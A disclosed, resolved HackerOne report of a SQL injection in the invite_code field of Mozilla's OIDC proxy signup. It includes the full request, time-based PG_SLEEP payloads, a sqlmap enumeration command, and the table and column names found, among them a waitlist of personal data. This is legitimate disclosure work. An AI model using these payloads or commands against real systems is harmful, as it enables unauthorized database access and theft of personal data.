---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2024-01-30
submitted: 2023-10-14T12:47:48.736Z
bounty_usd: null
votes: 93
cve: []
program: "[[programs/mozilla|Mozilla]]"
reporter: "supr4s"
source: "https://hackerone.com/reports/2209130"
title: "SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription"
---
# SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 93 | **Program:** Mozilla | **Disclosed:** 2024-01-30

- Report: [https://hackerone.com/reports/2209130](https://hackerone.com/reports/2209130)
- CWE: SQL Injection
- Submitted: 2023-10-14T12:47:48.736Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi everyone,

Hope you are well ! 

I wanted to play on [https://mozilla.social](https://mozilla.social), however this requires a user account and an invitation code as it's not open to the public. When entering an invitation code, the user is redirected to `prod.oidc-proxy.prod.webservices.mozgcp.net`.

{F2773206}

Playing around with what's on offer, I've noticed that the `invite_code` parameter is vulnerable to a PostgreSQL injection.

## Steps To Reproduce:

During registration, the following POST request is made : 

```
POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
Host: prod.oidc-proxy.prod.webservices.mozgcp.net
Cookie: <session_cookies>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua: "Google Chrome";v="103", "Chromium";v="103", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers

handle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on
```

Adding a single quote to the `invite_code` parameter returns a 500 error, and adding a second quote returns a 200. **Red flag**

After a few tests, here is a time-based blind payload to confirm the vulnerability : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

{F2773210}

Confirm with the response from the server - which takes 5 seconds to reply.

Now, 10 seconds : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

{F2773214}

Same here, 10 secs before getting an answer.

20 sec : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

{F2773218}

etc.

## Impact

From [OWASP](https://owasp.org/www-community/attacks/SQL_Injection) : 

> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

I'm working on a data exfiltration and will update the report as needed.

Looking forward to exchanging.

Regards,
Supr4s

## Timeline

- **Report Filed**
- **2023-10-14** @supr4s: Hi,

With the help of SQLMap, I was able to retrieve the following information : 

Database name : `public`

Tables : 

- `allowlist`
- `disallowed_handles`
- `invitation_tokens`
- `knex_migrations`
- `knex_migrations_lock`
- `oidc_payloads`
- `regexp_disallowed_handles`
- `sub_to_account`
- `waitlist`

To POC : 

```
$ sqlmap -r sqli-mozilla --level=3 -p invite_code --dbms=postgresql --tables --force-ssl
```
- **2023-10-14** @supr4s: From `waitlist` table, here are the columns found :

- `email`
- `first_name`
- `id`
- `last_name`
- `mastodon_handle` 
- `twitter_handle`

9438 entries in total.

From `waitlist` table : 

- `account`

And 722 entries in this column.

From `invitation_tokens` table, here are the columns found :

- `assigned`
- `assigned_at`
- `created_at`
- `last_name`
- `owner`
- `state`
- `token`

Current user of database : `oidcproxy`. He is not DBA.

__________________________

About the scope : 

I'm a bit lost between [https://hackerone.com/mozilla_critical_services](https://hackerone.com/mozilla_critical_services) and [https://hackerone.com/mozilla_core_services](https://hackerone.com/mozilla_core_services), I didn't notice that there was a second program open.
If ever the report is on the wrong program, could you move it ? :)

I think the report now needs to be critically appraised. Let me know if you want any further information or if I should continue with the operation.

Regards,
Supr4s
- **Report Severity Updated**
- **Report Pending Program Review**
- **Report Triaged**
- **Bounty Awarded**
- **2023-11-06** @supr4s: Hi,

Thanks for the bounty ! :)

May I ask why the amount corresponds to a Medium category, when we are here on some critical things in CVSS 9.1 ?

Thanks !

Supr4s
- **2023-11-06** @frida-k: Hello @supr4s , mozilla.social and the application which manages the invitations, where the issue is found, are both out of scope of our program. For out of scope assets, we pay in the range of 500-1000 for critical issues. Additionally, we paid out a bonus on top of that because of the impact on the application.

Thanks,
Frida
- **2023-11-06** @supr4s: Hi,

Thank you for your feedback and explanations !

Have a nice day.

Supr4s
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
- **Reassigned To Team**
